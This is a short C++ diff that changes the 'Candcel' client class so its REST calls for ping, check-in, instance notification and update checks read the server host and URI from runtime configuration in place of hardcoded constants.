@@ -45,7 +45,7 @@ void Candcel::IsAlive()
 	Log::Info(L"Candcel", L"Check if server is alive");
 
 	for (int i = 0; i < 10; ++i) {
-		RestClient rc(AVC_HOST, AVC_ENDPOINT);
+		RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());
 
 		rc.Call(RestClientCommand::CM_CLIENT_PING, new JSONValue);
 
@@ -80,7 +80,7 @@ DWORD Candcel::CheckIn()
 
 		Log::Info(L"Candcel", L"Sending checkin request");
 
-		RestClient rc(AVC_HOST, AVC_ENDPOINT);
+		RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());
 
 		JSONObject obj;
 		obj[L"guid"] = new JSONValue(Config::Current()->Guid());
@@ -114,7 +114,7 @@ void Candcel::Solicit()
 {
 	Log::Info(L"Candcel", L"Notify the server of this instance");
 
-	RestClient rc(AVC_HOST, AVC_ENDPOINT);
+	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());
 
 	std::map<std::wstring, std::wstring> *lEnv = Util::EnvVariables();
 
@@ -180,7 +180,7 @@ void Candcel::CheckForUpdate()
 
 	Log::Info(L"Candcel", L"Check for update");
 
-	RestClient rc(AVC_HOST, AVC_ENDPOINT);
+	RestClient rc(Config::Current()->AvcHost(), Config::Current()->AvcUri());
 
 	JSONObject obj;
 	obj[L"build"] = new JSONValue((double)clientVersion);
